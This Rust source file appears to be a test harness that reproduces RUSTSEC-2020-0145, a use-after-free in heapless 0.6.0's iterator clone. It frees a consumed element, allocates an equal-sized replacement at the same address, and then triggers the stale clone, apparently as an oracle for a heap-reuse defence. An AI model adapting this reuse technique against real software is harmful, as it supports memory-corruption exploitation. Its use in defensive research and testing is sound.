//! Derived A -> free -> B adapter for RUSTSEC-2020-0145.
//!
//! heapless 0.6.0's `IntoIter::clone` clones the whole inline vector, including
//! elements already moved out by `next`. Dropping the consumed element first
//! therefore leaves a stale one-word `Vec<u64>` payload pointer in the iterator.
//! This bounded adapter immediately requests an equal-layout, semantically
//! distinct `Replacement` before exercising that stale clone. Exact address
//! equality is the treatment oracle; the claim stops at this reuse edge.

use heapless::consts::U16;
use heapless::Vec as HeaplessVec;
use std::hint::black_box;

const VICTIM_TYPE_ID: u64 = 0x5253_4837_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4837_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4837_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4837_0000_0004;

pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

#[repr(transparent)]
struct Replacement(u64);

#[derive(Debug)]
struct DropDetector {
    payload: std::vec::Vec<u64>,
}

impl Clone for DropDetector {
    fn clone(&self) -> Self {
        // On the vulnerable dependency, cloning the iterator after `next`
        // reaches this dereference through an already-consumed inline slot.
        let value = black_box(self.payload[0]);
        Self {
            payload: vec![value],
        }
    }
}

// Keep the allocation helper noinline so the compiler audit sees a distinct
// critical site with the concrete owner type used by this adapter.
#[inline(never)]
fn materialize_payload(seed: &[u64; 1]) -> std::vec::Vec<u64> {
    seed.to_vec()
}

#[inline(never)]
fn reclaim_payload<T>(value: T) {
    drop(value);
}

fn main() {
    let seed = [0x5151_5151_5151_5151u64];
    let materialize: fn(&[u64; 1]) -> std::vec::Vec<u64> = materialize_payload;
    let payload = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || black_box(materialize)(&seed),
    );
    assert_eq!(payload.capacity(), 1);
    let original_address = payload.as_ptr() as usize;

    let mut values: HeaplessVec<DropDetector, U16> = HeaplessVec::new();
    values.push(DropDetector { payload }).unwrap();
    let mut iter = values.into_iter();
    let consumed = iter.next().expect("the victim element must exist");
    let reclaim: fn(DropDetector) = reclaim_payload;
    crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || black_box(reclaim)(consumed),
    );

    let replacement = Box::new(Replacement(0x4242_4242_4242_4242));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = (&*replacement as *const Replacement) as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");

    if original_address == replacement_address {
        let cloned = iter.clone();
        black_box(cloned);
    }
    black_box(&replacement.0);
    drop(iter);
    drop(replacement);
}
